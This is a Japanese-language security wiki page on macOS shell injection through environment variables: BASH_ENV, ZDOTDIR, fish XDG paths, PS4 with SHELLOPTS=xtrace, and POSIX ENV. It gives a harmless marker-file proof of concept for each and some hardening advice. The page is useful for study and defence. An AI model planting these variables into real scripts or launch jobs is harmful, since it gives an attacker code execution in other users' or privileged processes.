# macOS Shell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `BASH_ENV`

Bash がスクリプトまたは `-c` コマンドを実行するために非対話的に起動すると、`BASH_ENV` の値を展開し、要求されたコマンドを実行する前に、その結果得られたファイルを source します。Bash はこのファイルの検索に `PATH` を使用しません。そのため、攻撃者が制御する環境変数を使用して非対話的な Bash を起動するプロセスに、読み取り可能な shell payload を先に実行させることが可能です。<sup>[[1]](#references)</sup>
```bash
cat >/tmp/bash-startup-hook.sh <<'EOF'
#!/bin/bash
/usr/bin/touch /tmp/bash-env-executed
EOF

BASH_ENV=/tmp/bash-startup-hook.sh /bin/bash -c '/usr/bin/true'
test -e /tmp/bash-env-executed && echo 'BASH_ENV executed'
```
この hook は、対象が実際に Bash を起動した場合にのみ実行されます。別の platform 上の `/bin/sh` や、shell を使わずに command を実行する program は、必ずしもこれを honor しません。privileged mode の Bash は `BASH_ENV` を無視します。effective user/group ID と real user/group ID が異なる場合、Bash は startup files もスキップし、`-p` が指定されていない限り effective ID をリセットします。`-p` を指定すると privileged mode は有効なままになり、`BASH_ENV` も引き続き無視されます。<sup>[[1]](#references)[[2]](#references)</sup>

macOS では、`launchd` jobs が継承される、または job ごとの environment variables を定義できるため、privileged scripts に environment を渡す plists と launch contexts を調査してください。interpreter variables の sanitize を SIP だけに依存しないでください。最小限の environment（`env -i`）を使用し、`BASH_ENV` を明示的に unset し、意図した interpreter を absolute path で起動し、書き込み可能な startup files を避けてください。

## zsh `ZDOTDIR`

zsh は、non-interactive shells を含むすべての通常の shell で `$ZDOTDIR/.zshenv` を読み込みます。`ZDOTDIR` が unset の場合は `HOME` を使用します。そのため、`ZDOTDIR` を書き込み可能な directory に redirect すると、`zsh -c` command または script の前にその `.zshenv` が実行されます。<sup>[[3]](#references)</sup>
```bash
mkdir -p /tmp/zsh-startup
echo '/usr/bin/touch /tmp/zshenv-executed' > /tmp/zsh-startup/.zshenv
ZDOTDIR=/tmp/zsh-startup /bin/zsh -c /usr/bin/true
```
`zsh -f` は `RCS` オプションを解除し、このユーザーのスタートアップファイルをスキップします。グローバルな `/etc/zshenv` は引き続き読み込まれるため、信頼できる最小限の内容にしておく必要があります。

## fish の `XDG_CONFIG_HOME`

fish は、インタラクティブシェルやログインシェルに限らず、すべてのシェルの起動時に `$XDG_CONFIG_HOME/fish/conf.d/*.fish` と `$XDG_CONFIG_HOME/fish/config.fish` を読み込みます。また、`XDG_DATA_DIRS` のエントリ配下にある `fish/vendor_conf.d/*.fish` も実行します。そのため、攻撃者がこれらの変数のいずれかと、読み取り可能なディレクトリを制御できる場合、fish スクリプトや `-c` コマンドの前にコードを実行できます。<sup>[[4]](#references)</sup>
```bash
mkdir -p /tmp/fish-startup/fish
echo 'touch /tmp/fish-config-executed' > /tmp/fish-startup/fish/config.fish
XDG_CONFIG_HOME=/tmp/fish-startup fish -c true

# Vendor configuration variant
mkdir -p /tmp/fish-vendor/fish/vendor_conf.d
echo 'touch /tmp/fish-vendor-executed' > /tmp/fish-vendor/fish/vendor_conf.d/10-hook.fish
XDG_DATA_DIRS=/tmp/fish-vendor fish -c true
```
信頼できる invocation には `fish --no-config` を使用し、信頼できない XDG path variables をクリアしてください。

## bash `PS4` + xtrace (`SHELLOPTS`)

Bash が **xtrace** option を有効にして実行されている場合、trace 対象の各 command の前に `PS4` を展開して表示します。`PS4` は prompt と同様に展開されるため、その中にある **command substitution** が実行されます。**`PS4` の値**と xtrace を有効にする方法の両方を、完全に environment から指定できます。`SHELLOPTS=xtrace` を export すると、通常の `bash script.sh` で xtrace が有効になります（`-x` flag は不要です）。これにより、victim が実行するあらゆる Bash script を code execution に変えられます。<sup>[[5]](#references)</sup>
```bash
echo 'x=1; echo done' > /tmp/victim.sh

# Pure environment-variable injection (no -x on the command line)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a maintenance/CI job is run with debugging on
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` は、xtrace が有効化されるまで単独では何もしません（`SHELLOPTS=xtrace`、`set -x`、または `bash -x` によって有効化されます）。Bash は **privileged mode** では `SHELLOPTS` を無視します（`-p` による処理を伴わない、実 UID と実効 UID が異なる場合）。そのため、`BASH_ENV` と同じ setuid 上の注意点が適用されます。

## POSIX `ENV`

POSIX-style shells（`/bin/sh`、`dash`、`ksh`）は、起動時に **interactive** shell である場合、`ENV` 変数を読み取り、その内容を展開して、結果として得られたファイルを source します。これは `BASH_ENV`（*non-interactive* Bash で実行される）の POSIX counterpart であり、したがって `ENV` を制御できると、被害者が interactive な `sh`/`dash` を spawn するたびに code が実行されます。
```bash
echo 'touch /tmp/env-executed' > /tmp/env-hook.sh
echo 'exit' | ENV=/tmp/env-hook.sh dash -i
test -e /tmp/env-executed && echo 'ENV executed'
```
## References

- [1] [Bashの起動ファイル](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files)
- [2] [Bashの呼び出し](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [3] [zshの起動/終了ファイル](https://zsh.sourceforge.io/Doc/Release/Files.html#Startup_002fShutdown-Files)
- [4] [fishの設定ファイル](https://fishshell.com/docs/current/language.html#configuration-files)
- [5] [Bash変数 — `PS4`およびSetビルトイン（`xtrace`/`SHELLOPTS`）](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
{{#include ../../../banners/hacktricks-training.md}}
